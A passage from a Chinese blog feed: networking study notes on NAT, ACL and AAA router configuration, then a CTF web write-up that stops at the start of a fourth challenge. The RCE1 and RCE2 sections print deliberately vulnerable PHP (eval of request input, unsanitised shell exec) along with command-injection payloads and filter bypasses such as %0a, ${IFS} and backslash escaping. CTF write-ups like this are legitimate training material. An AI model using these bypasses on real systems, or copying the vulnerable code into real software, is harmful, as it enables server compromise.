    <url>/2021/07/20/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E4%BB%8B%E7%BB%8D/%E7%BD%91%E7%BB%9C%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2,%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E5%88%97%E8%A1%A8,AAA%E5%8E%9F%E7%90%86%E4%B8%8E%E9%85%8D%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="网络地址转换-访问控制列表-AAA原理与配置"><a href="#网络地址转换-访问控制列表-AAA原理与配置" class="headerlink" title="网络地址转换,访问控制列表,AAA原理与配置"></a>网络地址转换,访问控制列表,AAA原理与配置</h1><h2 id="1-网络地址转换"><a href="#1-网络地址转换" class="headerlink" title="1. 网络地址转换"></a>1. 网络地址转换</h2><h3 id="1-1-NAT应用场景"><a href="#1-1-NAT应用场景" class="headerlink" title="1.1 NAT应用场景"></a>1.1 NAT应用场景</h3><ul><li>随着网络设备的数量不断增长，对IPv4地址的需求也不断增加，导致可用IPv4地址空间逐渐耗尽。解决IPv4地址枯竭问题的权宜之计是分配可重复使用的各类私网地址段给企业内部或家庭使用。但是，私有地址不能在公网中路由，即私网主机不能与公网通信，也不能通过公网与另外一个私网通信</li><li>NAT是将IP数据报文头部中的IP地址转换为另一个IP地址的过程，主要用于实现内部网络(私有IP地址)访问外部网络（公有IP地址)的功能。NAT一般部署在连接内网和外网的网关设备上。当收到的报文源地址为私网地址、目的地址为公网地址时，NAT可以将源私网地址转换成一个公网地址。这样公网目的地就能够收到报文，并做出响应。此外，网关上还会创建一个NAT映射表，以便判断从公网收到的报文应该发往的私网目的地址</li></ul><h3 id="1-2-静态NAT"><a href="#1-2-静态NAT" class="headerlink" title="1.2 静态NAT"></a>1.2 静态NAT</h3><ul><li><p>NAT的实现方式有多种，适用于不同的场景</p></li><li><p>静态NAT实现了私有地址和公有地址的一对一映射。如果希望一台主机优先使用某个关联地址，或者想要外部网络使用一个指定的公网地址访问内部服务器时，可以使用静态NAT。但是在大型网络中，这种一对一的IP地址映射无法缓解公用地址短缺的问题</p></li><li><p>在本示例中</p><p><img src="https://pic.imgdb.cn/item/60f6e73b5132923bf89841f2.png"></p><p>源地址为192.168.1.1的报文需要发往公网地址100.1.1.1。在网关RTA上配置了一个私网地址192.168.1.1到公网地址200.10.10.1的映射。当网关收到主机A发送的数据包后，会先将报文中的源地址192.168.1.1转换为200.10.10.1，然后转发报文到目的设备。目的设备回复的报文目的地址是200.10.10.1。当网关收到回复报文后，也会执行静态地址转换，将200.10.10.1转换成192.168.1.1，然后转发报文到主机A。和主机A在同一个网络中其他主机，如主机B，访问公网的过程也需要网关RTA做静态NAT转换</p></li></ul><h3 id="1-3-动态NAT"><a href="#1-3-动态NAT" class="headerlink" title="1.3 动态NAT"></a>1.3 动态NAT</h3><ul><li><p>动态NAT通过使用地址池来实现</p></li><li><p>本示例中</p><p><img src="https://pic.imgdb.cn/item/60f6e7765132923bf899a356.png"></p><p>当内部主机A和主机B需要与公网中的目的主机通信时，网关RTA会从配置的公网地址池中选择一个未使用的公网地址与之做映射。每台主机都会分配到地址池中的一个唯一地址。当不需要此连接时，对应的地址映射将会被删除，公网地址也会被恢复到地址池中待用。当网关收到回复报文后，会根据之前的映射再次进行转换之后转发给对应主机</p></li><li><p>动态NAT地址池中的地址用尽以后，只能等待被占用的公用IP被释放后，其他主机才能使用它来访问公网</p></li></ul><h3 id="1-4-NAPT"><a href="#1-4-NAPT" class="headerlink" title="1.4 NAPT"></a>1.4 NAPT</h3><p>网络地址端口转换NAPT (Network Address Port Translation )允许多个内部地址映射到同一个公有地址的不同端口。</p><ul><li><p>本例中</p><p><img src="https://pic.imgdb.cn/item/60f6e7ed5132923bf89c6350.png"></p><p>RTA收到一个私网主机发送的报文，源P地址是192.168.1.1，源端口号是1025，目的IP地址是100.1.1.1，目的端口是80。RTA会从配置的公网地址池中选择一个空闲的公网IP地址和端口号，并建立相应的NAPT表项。这些NAPT表项指定了报文的私网IP地址和端口号与公网IP地址和端口号的映射关系。之后，RTA将报文的源IP地址和端口号转换成公网地址200.10.10.1和端口号2843，并转发报文到公网。当网关RTA收到回复报文后，会根据之前的映射表再次进行转换之后转发给主机A。主机B同理</p></li></ul><h3 id="1-5-Easy-IP"><a href="#1-5-Easy-IP" class="headerlink" title="1.5 Easy IP"></a>1.5 Easy IP</h3><ul><li><p>Easy IP适用于小规模局域网中的主机访问Internet的场景。小规模局域网通常部署在小型的网吧或者办公室中，这些地方内部主机不多，出接口可以通过拨号方式获取一个临时公网P地址。Easy IP可以实现内部主机使用这个临时公网IP地址访问Internet</p></li><li><p>本示例</p><p><img src="https://pic.imgdb.cn/item/60f6e82c5132923bf89dd5b2.png"></p><p>说明了EasyIP的实现过程。RTA收到一个主机A访问公网的请求报文，报文的源IP地址是192.168.1.1，源端口号是1025。RTA会建立EasyIP表项，这些表项指定了源IP地址和端口号与出接口的公网IP地址和端口号的映射关系。之后，根据匹配的Easy IP表项，将报文的源IP地址和端口号转换成出接口的IP地址和端口号，并转发报文到公网。报文的源IP地址转换成200.10.10.10/24，相应的端口号是2843</p></li><li><p>路由器收到回复报文后，会根据报文的目的IP地址和端口号，查询Easy IP表项。路由器根据匹配的Easy IP表项，将报文的目的IP地址和端口号转换成私网主机的IP地址和端口号，并转发报文到主机</p></li></ul><h3 id="1-6-NAT-服务器"><a href="#1-6-NAT-服务器" class="headerlink" title="1.6 NAT 服务器"></a>1.6 NAT 服务器</h3><ul><li><p>NAT在使内网用户访问公网的同时，也屏蔽了公网用户访问私网主机的需求。当一个私网需要向公网用户提供Web和SFTP服务时，私网中的服务器必须随时可供公网用户访问</p></li><li><p>NAT服务器可以实现这个需求，但是需要配置服务器私网IP地址和端口号转换为公网IP地址和端口号并发布出去。路由器在收到一个公网主机的请求报文后，根据报文的目的IP地址和端口号查询地址转换表项。路由器根据匹配的地址转换表项，将报文的目的IP地址和端口号转换成私网IP地址和端口号，并转发报文到私网中的服务器</p></li><li><p>本例中</p><p><img src="https://pic.imgdb.cn/item/60f6e8765132923bf89f86c5.png"></p><p>主机C需要访问私网服务器，发送报文的目的IP地址是200.10.10.1，目的端口号是80RTA收到此报文后会查找地址转换表项，并将目的IP地址转换成192.168.1.1，目的端口号保持不变。服务器收到报文后会进行响应，RTA收到私网服务器发来的响应报文后，根据报文的源IP地址192.168.1.1和端口号80查询地址转换表项。然后，路由器根据匹配的地址转换表项，将报文的源IP地址和端口号转换成公网IP地址200.10.10.1和端口号80，并转发报文到目的公网主机</p></li></ul><h3 id="1-7-静态NAT配置"><a href="#1-7-静态NAT配置" class="headerlink" title="1.7 静态NAT配置"></a>1.7 静态NAT配置</h3><ul><li><code>nat static global</code> <em>{ global-address}</em> <code>inside</code> <em>{host-address}</em> 命令用于创建静态NAT<ol><li>global参数用于配置外部公网地址</li><li>inside参数用于配置内部私有地址</li></ol></li></ul><h3 id="1-8-配置验证"><a href="#1-8-配置验证" class="headerlink" title="1.8 配置验证"></a>1.8 配置验证</h3><p>命令<code>display nat static</code>用于查看静态NAT的配置</p><ul><li>Global IP/Port表示公网地址和服务端口号</li><li>Inside IP/Port表示私有地址和服务端口号</li></ul><h3 id="1-9-动态NAT配置"><a href="#1-9-动态NAT配置" class="headerlink" title="1.9 动态NAT配置"></a>1.9 动态NAT配置</h3><ul><li><p><code>nat outbound</code>命令用来将一个访问控制列表ACL和一个地址池关联起来，表示ACL中规定的地址可以使用地址池进行地址转换。ACL用于指定一个规则，用来过滤特定流量。后续将会介绍有关ACL的详细信息</p></li><li><p><code>nat address-group</code>命令用来配置NAT地址池</p></li><li><p>本示例中</p><p><img src="https://pic.imgdb.cn/item/60f6e95d5132923bf8a4de6b.png"></p><p>使用<code>nat outbound</code>命令将ACL 2000与待转换的192.168.1.0/24网段的流量关联起来，并使用地址池1 ( <code>address-group 1</code> )中的地址进行地址转换。<code>no-pat</code>表示只转换数据报文的地址而不转换端口信息。</p></li></ul><h3 id="1-10-配置验证2"><a href="#1-10-配置验证2" class="headerlink" title="1.10 配置验证2"></a>1.10 配置验证2</h3><ul><li><p><code>display nat address-group group-index</code>命令用来查看NAT地址池配置信息</p></li><li><p>命令<code>display nat outbound</code>用来查看动态NAT配置信息</p></li><li><p>可以用这两条命令验证动态NAT的详细配置</p></li><li><p>在本示例中</p><p><img src="https://pic.imgdb.cn/item/60f6e9bb5132923bf8a70b47.png"></p><p>指定接口Serial1/0/0与ACL关联在一起，并定义了用于地址转换的地址池1。参数<code>no-pat</code>说明没有进行端口地址转换</p></li></ul><h3 id="1-11-Easy-IP配置"><a href="#1-11-Easy-IP配置" class="headerlink" title="1.11 Easy IP配置"></a>1.11 Easy IP配置</h3><ul><li><p><code>nat outbound acl-number</code>命令用来配置Easy-IP地址转换。Easy IP的配置与动态NAT的配置类似，需要定义ACL和<code>nat outbound</code>命令，主要区别是EasyIP不需要配置地址池，所以<code>nat outbound</code>命令中不需要配置参数<code>address-group</code></p></li><li><p>在本示例中</p><p><img src="https://pic.imgdb.cn/item/60f6eb295132923bf8af7210.png"></p><p>命令<code>nat outbound 2000</code>表示对ACL 2000定义的地址段进行地址转换，并且直接使用Serial1/0/0接口的IP地址作为NAT转换后的地址</p></li><li><p>命令<code>display nat outbound</code>用于查看命令<code>nat outbound</code>的配置结果</p></li><li><p>Address-group/IP/Interface表项表明接口和ACL已经关联成功，type表项表明Easy IP已经配置成功</p></li></ul><h3 id="1-12-NAT服务器配置"><a href="#1-12-NAT服务器配置" class="headerlink" title="1.12 NAT服务器配置"></a>1.12 NAT服务器配置</h3><ul><li><code>nat server</code> [ <code>protocol</code> <em>{fprotocol-number | icmp / tcp | udp}</em> <code>global</code> <em>{ global-address| current-interface global-port}</em> <code>inside</code> <em>{host-address host-port }</em> <code>vpn-instance</code> <em>vpn-instance-name</em> <code>acl</code> <em>acl-number</em> <code>description</code> <em>description</em>]命令用来定义一个内部服务器的映射表，外部用户可以通过公网地址和端口来访问内部服务器</li><li>参数protocol指定一个需要地址转换的协议</li><li>参数global-address指定需要转换的公网地址</li><li>参数inside指定内网服务器的地址</li><li><code>display nat server</code>命令用于查看详细的NAT服务器配置结果</li><li>可以通过此命令验证地址转换的接口、全局和内部IP地址以及关联的端口号</li></ul><h2 id="2-访问控制列表"><a href="#2-访问控制列表" class="headerlink" title="2. 访问控制列表"></a>2. 访问控制列表</h2><h3 id="2-1-ACL应用场景"><a href="#2-1-ACL应用场景" class="headerlink" title="2.1 ACL应用场景"></a>2.1 ACL应用场景</h3><ul><li><p>ACL是由一系列规则组成的集合。设备可以通过这些规则对数据包进行分类，并对不同类型的报文进行不同的处理</p></li><li><p>本示例中</p><p><img src="https://pic.imgdb.cn/item/60f772655132923bf8319bf9.png"></p><p>网关RTA允许192.168.1.0/24中的主机可以访问外网，也就是Interne；而192.168.2.0/24中的主机则被禁止访问Internet</p><p>对于服务器A而言，情况则相反。网关允许192.168.2.0/24中的主机访问服务器A，但却禁止192.168.1.0/24中的主机访问服务器A</p></li><li><p>设备可以依据ACL中定义的条件（例如源IP地址）来匹配入方向的数据，并对匹配了条件的数据执行相应的动作</p></li><li><p>在本示例所述场景中</p><p>设备可以依据ACL中定义的条件（例如源IP地址）来匹配入方向的数据，并对匹配了条件的数据执行相应的动作。在本示例所述场景中，RTA依据所定义的ACL而匹配到的感兴趣流量来自192.168.2.0/24网络，RTA会对这些感兴趣流量进行加密（虚拟局域网VPN中会进行介绍）之后再转发</p><p>RTA依据所定义的ACL而匹配到的感兴趣流量来自192.168.2.0/24网络，RTA会对这些感兴趣流量进行加密（虚拟局域网VPN中会进行介绍）之后再转发</p></li></ul><h3 id="2-2-ACL分类"><a href="#2-2-ACL分类" class="headerlink" title="2.2 ACL分类"></a>2.2 ACL分类</h3><ul><li>根据不同的划分规则，ACL可以有不同的分类。最常见的三种分类是基本ACL、高级ACL和二层ACL<ol><li>基本ACL可以使用报文的源IP地址、分片标记和时间段信息来匹配报文，其编号取值范围是2000-2999</li><li>高级ACL可以使用报文的源/目的IP地址、源/目的端口号以及协议类型等信息来匹配报文。高级ACL可以定义比基本ACL更准确、更丰富、更灵活的规则，其编号取值范围是3000-3999</li><li>二层ACL可以使用源/目的MAC地址以及二层协议类型等二层信息来匹配报文，其编号取值范围是4000-4999</li></ol></li></ul><h3 id="2-3-ACL规则"><a href="#2-3-ACL规则" class="headerlink" title="2.3 ACL规则"></a>2.3 ACL规则</h3><ul><li><p>一个ACL可以由多条“deny | permit”语句组成，每一条语句描述了一条规则。设备收到数据流量后，会逐条匹配ACL规则，看其是否匹配。如果不匹配，则匹配下一条。一旦找到一条匹配的规则，则执行规则中定义的动作，并不再继续与后续规则进行匹配。如果找不到匹配的规则，则设备不对报文进行任何处理。需要注意的是，ACL中定义的这些规则可能存在重复或矛盾的地方。规则的匹配顺序决定了规则的优先级，ACL通过设置规则的优先级来处理规则之间重复或矛盾的情形</p></li><li><p>ARG3系列路由器支持两种匹配顺序︰配置顺序和自动排序</p><ol><li>配置顺序按ACL规则编号(rule-id )从小到大的顺序进行匹配。设备会在创建ACL的过程中自动为每一条规则分配一个编号，规则编号决定了规则被匹配的顺序。例如，如果将步长设定为5，则规则编号将按照5、10、15…这样的规律自动分配。如果步长设定为2，则规则编号将按照2、4、6、8…这样的规律自动分配。通过设置步长，使规则之间留有一定的空间，用户可以在已存在的两个规则之间插入新的规则。路由器匹配规则时默认采用配置顺序。另外，ARG3系列路由器默认规则编号的步长是5</li><li>自动排序使用“深度优先”的原则进行匹配，即根据规则的精确度排序</li></ol></li><li><p>本示例中</p><p><img src="https://pic.imgdb.cn/item/60f7743c5132923bf836f10f.png"></p><p>RTA收到了来自两个网络的报文。默认情况下，RTA会依据ACL的配置顺序来匹配这些报文。网络172.16.0.0/24发送的数据流量将被RTA上配置的ACL2000的规则15匹配，因此会被拒绝。而来自网络172.17.0.0/24的报文不能匹配访问控制列表中的任何规则，因此RTA对报文不做任何处理，而是正常转发</p></li></ul><h3 id="2-4-基本ACL配置"><a href="#2-4-基本ACL配置" class="headerlink" title="2.4 基本ACL配置"></a>2.4 基本ACL配置</h3><ul><li><p><code>acl [ number ]</code>命令用来创建一个ACL，并进入ACL视图</p></li><li><p><code>rule [ rule-id ] &#123; deny | permit &#125; source ( source-address source-wildcard | any &#125;</code> 命令用来增加或修改ACL的规则。deny用来指定拒绝符合条件的数据包，permit用来指定允许符合条件的数据包，source用来指定ACL规则匹配报文的源地址信息，any表示任意源地址</p></li><li><p><code>traffic-filter ( inbound | outbound &#125;acl( acl-number&#125;</code> 命令用来在接口上配置基于ACL对报文进行过滤</p></li><li><p>本示例中</p><p><img src="https://pic.imgdb.cn/item/60f7753a5132923bf839ce03.png"></p><p>主机A发送的流量到达RTA后，会匹配ACL2000中创建的规则rule denysource 192.168.1.0 0.0.0.255，因而将被拒绝继续转发到Internet。主机B发送的流量不匹配任何规则，所以会被RTA正常转发到Internet</p></li><li><p>配置确认：</p><ul><li>执行<code>display acl &lt;acl-number&gt;</code>命令可以验证配置的基本ACL</li><li>执行<code>display traffic-filter applied-record</code>命令可以查看设备上所有基于ACL进行报文过滤的应用信息，这些信息可以帮助用户了解报文过滤的配置情况并核对其是否正确，同时也有助于进行相关的故障诊断与排查</li></ul></li></ul><h3 id="2-5-高级ACL配置"><a href="#2-5-高级ACL配置" class="headerlink" title="2.5 高级ACL配置"></a>2.5 高级ACL配置</h3><ul><li><p>基本ACL可以依据源IP地址进行报文过滤，而高级ACL能够依据源/目的IP地址、源/目的端口号、网络层及传输层协议以及IP流量分类和TCP标记值等各种参数（SYN|ACK|FIN等)进行报文过滤</p></li><li><p>本示例中</p><p><img src="https://pic.imgdb.cn/item/60f775ba5132923bf83b40fc.png"></p><p>RTA上定义了高级ACL3000，其中第一条规则“rule deny tcp source<br>192.168.1.0 0.0.0.255 destination 172.16.10.10.0.0.0 destination-port eq 21”用于限制源地址范围是192.168.1.0/24，目的IP地址为172.16.10.1，目的端口号为21的所有TCP报文;第二条规则“rule deny tcp source 192.168.2.0 0.0.0.255 destination<br>172.16.10.2 0.0.0.0”用于限制源地址范围是192.168.2.0/24，目的地址是172.16.10.2的所有TCP报文﹔第三条规则“rule permit ip”用于匹配所有IP报文，并对报文执行允许动作</p></li><li><p>执行<code>display acl &lt;acl-number&gt;</code>命令可以验证配置的高级ACL</p></li></ul><h3 id="2-6-ACL应用-NAT"><a href="#2-6-ACL应用-NAT" class="headerlink" title="2.6 ACL应用-NAT"></a>2.6 ACL应用-NAT</h3><ul><li><p>ACL还可用于网络地址转换操作，以便在存在多个地址池的情况下，确定哪些内网地址是通过哪些特定外网地址池进行地址转换的。例如，某企业网络作为客户连接到多个服务供应商网络，企业网络内的用户位于不同的网段/子网，他们期望分别通过某个特定的地址组进行地址转换来实现报文转发。这种情况极有可能发生在连接不同服务供应商网络的路由器上行端口</p></li><li><p>本示例中</p><p><img src="https://pic.imgdb.cn/item/60f7760c5132923bf83c2f71.png"></p><p>要求192.168.1.0/24中的主机使用地址池1中的公网地址进行地址转换，而192.168.2.0/24中的主机使用地址池2中的公网地址进行地址转换</p></li><li><p>执行<code>nat outbound &lt;acl-number&gt; address-group &lt;address-group number&gt;</code>命令，可以将NAT与ACL绑定</p></li><li><p>本示例</p><p><img src="https://pic.imgdb.cn/item/60f7764d5132923bf83cecd2.png"></p><p>私网192.168.1.0/24将使用地址池220.110.10.8-220.110.10.15进行地址转换，私网192.168.2.0/24将使用地址池202.115.60.1-202.115.60.30进行地址转换</p></li></ul><h2 id="3-AAA原理与配置"><a href="#3-AAA原理与配置" class="headerlink" title="3. AAA原理与配置"></a>3. AAA原理与配置</h2><h3 id="3-1-AAA应用场景"><a href="#3-1-AAA应用场景" class="headerlink" title="3.1 AAA应用场景"></a>3.1 AAA应用场景</h3><ul><li>AAA是一种提供认证、授权和计费的安全技术。该技术可以用于验证用户帐户是否合法，授权用户可以访问的服务，并记录用户使用网络资源的情况</li><li>例如，企业总部需要对服务器的资源访问进行控制，只有通过认证的用户才能访问特定的资源，并对用户使用资源的情况进行记录。在这种场景下，可以按照如图所示的方案进行AAA部署，NAS为网络接入服务器，负责集中收集和管理用户的访问请求</li><li>AAA服务器表示远端的Radius或HWTACACS服务器，负责制定认证、授权和计费方案。如果企业分支的员工希望访问总部的服务器，远端的Radius或HWTACACS服务器会要求员工发送正确的用户名和密码，之后会进行验证，通过后则执行相关的授权策略，接下来，该员工就可以访问特定的服务器了。如果还需要记录员工访问网络资源的行为，网络管理员还可以在Radius或HWTACACS服务器上配置计费方案</li><li>目前，ARG3系列路由器只支持配置认证和授权</li></ul><h3 id="3-2-认证"><a href="#3-2-认证" class="headerlink" title="3.2 认证"></a>3.2 认证</h3><ul><li>AAA支持三种认证方式<ol><li>不认证︰完全信任用户，不对用户身份进行合法性检查。鉴于安全考虑，这种认证方式很少被采用</li><li>本地认证︰将本地用户信息（包括用户名、密码和各种属性)配置在NAS上。本地认证的优点是处理速度快、运营成本低;缺点是存储信息量受设备硬件条件限制</li><li>远端认证∶将用户信息（包括用户名、密码和各种属性）配置在认证服务器上。AAA支持通过RADIUS协议或HWTACACS协议进行远端认证。NAS作为客户端，与RADIUS服务器或HWTACACS服务器进行通信</li></ol></li><li>如果一个认证方案采用多种认证方式，这些认证方式按配置顺序生效。比如，先配置了远端认证，随后配置了本地认证，那么在远端认证服务器无响应时，会转入本地认证方式。如果只在本地设备上配置了登录账号，没有在远端服务器上配置，AR2200认为账号没有通过远端认证，不再进行本地认证</li></ul><h3 id="3-3-授权"><a href="#3-3-授权" class="headerlink" title="3.3 授权"></a>3.3 授权</h3><ul><li>AAA授权功能赋予用户访问的特定网络或设备的权限。AAA支持以下授权方式:<ol><li>不授权︰不对用户进行授权处理</li><li>本地授权︰根据NAS上配置的本地用户账号的相关属性进行授权</li><li>远端授权:HWTACACS授权，使用TACACS服务器对用户授权。RADIUS授权，过RADIUS服务器认证的用户授权。RADIUS协议的认证和授权是绑定在一起的，不能单独使用RADIUS进行授权</li></ol></li><li>如果在一个授权方案中使用多种授权方式，这些授权方式按照配置顺序生效。不授权方式最后生效</li></ul><h3 id="3-4-计费"><a href="#3-4-计费" class="headerlink" title="3.4 计费"></a>3.4 计费</h3><ul><li>计费功能用于监控授权用户的网络行为和网络资源的使用情况。AAA支持以下两种计费方式<ol><li>不计费∶为用户提供免费上网服务，不产生相关活动日志</li><li>远端计费∶通过RADIUS服务器或HWTACACS服务器进行远端计费。RADIUS服务器或HWTACACS服务器具备充足的储存空间，可以储存各授权用户的网络访问活动日志，支持计费功功能</li></ol></li></ul><h3 id="3-5-AAA域"><a href="#3-5-AAA域" class="headerlink" title="3.5 AAA域"></a>3.5 AAA域</h3><ul><li>设备基于域来对用户进行管理，每个域都可以配置不同的认证、授权和计费方案，用于对该域下的用户进行认证、授权和计费。每个用户都属于某一个域。用户属于哪个域是由用户名中的域名分隔符@后的字符串决定。例如，如果用户名是user@huawei，则用户属于huawei域。如果用户名后不带有@，则用户属于系统缺省域default</li><li>ARG3系列路由设备支持两种缺省域：<ol><li>default域为普通用户的缺省域</li><li>default_admin域为管理用户的缺省域</li></ol></li><li>用户可以修改但不能删除这两个缺省域。默认情况下，设备最多支持32个域，包括两个缺省域</li></ul><h3 id="3-6-AAA配置"><a href="#3-6-AAA配置" class="headerlink" title="3.6 AAA配置"></a>3.6 AAA配置</h3><ul><li><code>authentication-scheme authentication-scheme-name</code>命令用来配置域的认证方案。缺省情况下，域使用名为“default”的认证方案</li><li><code>authentication-mode &#123; hwtacacs | radius | local &#125;</code>命令用来配置认证方式，local指定认证模方式为本地认证。缺省情况下，认证方式为本地认证</li><li><code>authorization-scheme authorization-scheme-name</code>命令用来配置域的授权方案。缺省情况下，域下没有绑定授权方案</li><li><code>authorization-mode &#123; [ hwtacacs | if-authenticated | local ] * [ none ] &#125;</code>命令用来配置当前授权方案使用的授权方式。缺省情况下，授权模式为本地授权方式</li><li><code>domain domain-name</code>命令用来创建域，并进入AAA域视图</li><li><code>local-user user-name password cipher password</code>命令用来创建本地用户，并配置本地用户的密码。如果用户名中带域名分隔符，如@，则认为@前面的部分是用户名，后面部分是域名。如果没有@，则整个字符串为用户名，域为默认域</li><li><code>local-user user-name privilege level level</code>命令用来指定本地用户的优先级</li></ul><p>配置验证：</p><p><code>display domain [ name domain-name ]</code>命令用来查看域的配置信息</p><p>Domain-state为Active表示激活状态。Authentication-scheme-name表示域使用的认证方案为auth1。缺省情况下，域使用系统自带的default认证方案。Authorization-<br>scheme-name表示域使用的授权方案为auth2</p>]]></content>
    
    
    <categories>
      
      <category>网络基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络基础</tag>
      
      <tag>访问控制介绍</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Web练习题1</title>
    <link href="/2021/07/20/%E4%BF%A1%E5%AE%89/CTF/Web/Web%E7%BB%83%E4%B9%A0%E9%A2%981/"/>
    <url>/2021/07/20/%E4%BF%A1%E5%AE%89/CTF/Web/Web%E7%BB%83%E4%B9%A0%E9%A2%981/</url>
    
    <content type="html"><![CDATA[<h1 id="1-Robots"><a href="#1-Robots" class="headerlink" title="1. Robots"></a>1. Robots</h1><p>题目地址<a href="http://host:port/web/robots/index.php">http://host:port/web/robots/index.php</a></p><p>访问地址后显示内容</p><p><img src="https://pic.imgdb.cn/item/60f6ce575132923bf8150a4a.png"></p><p>需要找到admin界面，参考题目中的robots，访问robots.txt</p><p>显示内容有/11111111目录，访问该目录</p><p>显示内容</p><blockquote><p>you find me,but I am not the login page. keep search.</p></blockquote><p>此时根据显示的提示，访问该目录下的login.php</p><p>得到flag：flag{4067152f7f9a6c51176b8fbf4ebf8d93}</p><h1 id="2-RCE1"><a href="#2-RCE1" class="headerlink" title="2. RCE1"></a>2. RCE1</h1><p>访问<a href="http://host:port/web/rce1/index.php">http://host:port/web/rce1/index.php</a></p><p>获得源码</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><span class="hljs-variable">$a</span> = @<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;hello&#x27;</span>];<br><span class="hljs-keyword">eval</span>( <span class="hljs-string">&quot;var_dump(<span class="hljs-subst">$a</span>);&quot;</span>);<br>show_source(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></div></td></tr></table></figure><p>根据返回的内容，可以控制的参数是$a，尝试将var_dump闭合后输出自己需要的内容</p><p>传入参数?hello=);echo(hello。发现输出内容hello。证明可以通过eval获取内容</p><p>查询目录下的文件</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">?hello=);<span class="hljs-keyword">print</span>(`ls`<br><span class="hljs-comment"># 获得内容1.php flag.php index.php</span><br><span class="hljs-comment"># 读取flag.php内容后发现无回显，尝试其他的函数也无果</span><br>?hello=);<span class="hljs-keyword">print</span>(`cat flag.php`<br></code></pre></div></td></tr></table></figure><p>最后注意到已经包含了flag.php文件</p><p>尝试直接输出flag内容 ?hello=);print($flag</p><p><img src="https://pic.imgdb.cn/item/60f6d3015132923bf82db1eb.png"></p><p>得到flag：flag{Ni_1s_vEry_Str0ng}</p><h1 id="3-RCE2"><a href="#3-RCE2" class="headerlink" title="3. RCE2"></a>3. RCE2</h1><p>访问<a href="http://host:port/web/rce1/index.php">http://host:port/web/rce1/index.php</a></p><p>源码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php+HTML">&lt;?php<br><br>$res = FALSE;<br><br>if (isset($_GET[&#x27;ip&#x27;]) &amp;&amp; $_GET[&#x27;ip&#x27;]) &#123;<br>    $ip = $_GET[&#x27;ip&#x27;];<br>    $m = [];<br>    if (!preg_match_all(&quot;/(\||&amp;|;| |\/|cat|flag)/&quot;, $ip, $m)) &#123;<br>        $cmd = &quot;ping -c 4 &#123;$ip&#125;&quot;;<br>        exec($cmd, $res);<br>    &#125; else &#123;<br>        $res = $m;<br>    &#125;<br>&#125;<br>?&gt;<br><br>&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;RCE2&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br><br>&lt;h1&gt;RCE2&lt;/h1&gt;<br><br>&lt;form action=&quot;#&quot; method=&quot;GET&quot;&gt;<br>    &lt;label for=&quot;ip&quot;&gt;IP : &lt;/label&gt;&lt;br&gt;<br>    &lt;input type=&quot;text&quot; id=&quot;ip&quot; name=&quot;ip&quot;&gt;<br>    &lt;input type=&quot;submit&quot; value=&quot;Ping&quot;&gt;<br>&lt;/form&gt;<br><br>&lt;hr&gt;<br><br>&lt;pre&gt;<br>&lt;?php<br>if ($res) &#123;<br>    print_r($res);<br>&#125;<br>?&gt;<br>&lt;/pre&gt;<br><br>&lt;?php<br>show_source(__FILE__);<br>?&gt;<br><br>&lt;/body&gt;<br>&lt;/html&gt; <br></code></pre></div></td></tr></table></figure><p>这里常用的<code>|</code>,<code>&amp;</code>,<code>;</code>都被限制了，经过查询，%0a可以进行绕过。利用ls尝试得到回显</p><p><img src="https://pic.imgdb.cn/item/60f6d47b5132923bf834dbb5.png"></p><p>之后根据返回的内容准备切换到flag_is_here后获取目录，由于flag被限制了，所以尝试\绕过</p><p>在尝试过程中始终没有正确的回显，尝试将空格换成${IFS}之后获得回显</p><p><img src="https://pic.imgdb.cn/item/60f6d5b95132923bf83ac48d.png"></p><p>最后读取文件中的内容即可，还是利用\绕过检查</p><p>flag：flag{4593c1e6aa2f57ac2b76500f2c5cea5d99fa7c7b}</p><h1 id="4-input"><a href="#4-input" class="headerlink" title="4. input"></a>4. input</h1><p>访问<a href="http://host:port/web/rce1/index.php">http://host:port/web/rce1/index.php</a></p><p>由于直接使用BP访问的，所以直接就看到了隐藏的代码</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs 